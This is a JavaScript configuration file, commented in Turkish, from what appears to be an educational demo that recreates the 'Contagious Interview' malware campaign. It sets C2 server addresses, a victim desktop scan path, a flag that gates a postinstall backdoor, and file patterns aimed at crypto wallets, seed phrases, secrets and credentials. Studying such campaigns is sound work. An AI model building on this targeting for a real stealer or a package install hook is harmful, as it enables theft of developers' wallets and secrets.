"use strict";

/**
 * config.js
 * ---------
 * Demo genelinde paylaşılan ayarlar. Rapordaki gerçek vakada bu değerler
 * obfuscated kod içine sabit olarak gömülüydü. Biz aynı fikri koruyoruz
 * ama esneklik için ortam değişkenlerini de destekliyoruz.
 * 
 * ÖNEMLİ: Bu demo ASLA gerçek internete çıkmamalı. Tüm trafik sadece
 * localhost veya sizin belirttiğiniz özel ağ IP'si üzerinden olmalıdır.
 */

const path = require("path");

module.exports = {
  // --- C2 Bağlantı Ayarları ---
  // Linux saldırgan makinesinin IP'sini buraya yazın.
  // Örnek: "http://192.168.1.100:4000"
  // Eğer ortam değişkeni tanımlıysa onu kullan, yoksa varsayılan localhost.
  c2HttpBase: process.env.DEMO_C2_HTTP || "http://127.0.0.1:4000",
  c2SocketUrl: process.env.DEMO_C2_SOCKET || "http://127.0.0.1:4000",

  // --- Kampanya Kimliği (Gerçek rapordaki "uid" alanının karşılığı) ---
  // Bu demo'yu C2 panelinde ayırt etmek için kullanılır.
  demoCampaignId: "demo-contagious-interview-egitim",

  // --- Taranacak Kök Dizin (scanRootDir) ---
  // filescanner.js bu dizini özyinelemeli olarak tarar.
  // Gerçek vakada tüm sürücüler (C:, D:) taranıyordu, ancak bu demo'da
  // bilinçli olarak sadece belirli bir klasörle sınırlandırıyoruz.
  // Windows Desktop'u taramak için aşağıdaki yolu kullanıyoruz.
  // NOT: Bu yol, kurban Windows kullanıcı adının "wall-e" olduğu varsayımıyla yazılmıştır.
  scanRootDir: process.env.DEMO_SCAN_ROOT || "C:\\Users\\wall-e\\Desktop",

  // --- Postinstall Zincirini Tetikleme Bayrağı ---
  // Bu bayrak olmadan npm install çalıştırıldığında backdoor devreye girmez.
  requiredEnvFlag: "DEMO_ACTIVE",

  // --- Dosya Tarama Desenleri (Opsiyonel, filescanner.js'de zaten tanımlı) ---
  // Burada sadece bilgi amaçlı, asıl desenler filescanner.js içinde.
  searchPatterns: [
    "*.env*", "*metamask*", "*phantom*", "*bitcoin*", "*trust*",
    "*phrase*", "*secret*", "*credential*", "*profile*", "*account*",
    "*mnemonic*", "*seed*", "*recovery*", "*backup*", "*address*",
    "*keypair*", "*wallet*", "*.doc", "*.docx", "*.pdf", "*.md",
    "*.xls", "*.xlsx", "*.txt", "*.ini", "*.json"
  ],

  // --- Dışlanacak Klasörler (Opsiyonel) ---
  excludeFolders: [
    "node_modules", "npm", "hooks", "android", "example", "AppData",
    "vendors", "vendor", "public", "css", "less", "scss", ".cache",
    ".conda", ".ssh", ".git", ".github", "cache", "tmp", "temp",
    "dist", "build", ".next", ".vscode", "package-lock.json",
    "Program Files", "Program Files (x86)", "ProgramData",
    "Windows", "Microsoft", "$RECYCLE.BIN"
  ]
};